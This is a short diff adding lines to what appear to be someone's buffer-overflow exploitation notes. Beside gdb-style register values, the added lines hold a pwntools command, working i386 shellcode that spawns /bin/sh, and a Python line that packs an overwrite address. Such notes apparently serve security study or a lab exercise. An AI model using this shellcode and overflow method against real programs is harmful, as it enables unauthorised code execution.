@@ -64,6 +64,13 @@ $1 = 0xbffff6cc
 
 $3 = 80
 
+shellcraft i386.linux.sh
+
+6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80
+
+python3 -c 'import struct; print(struct.pack(">L", 0x44840408))'
+
+
 
 
 
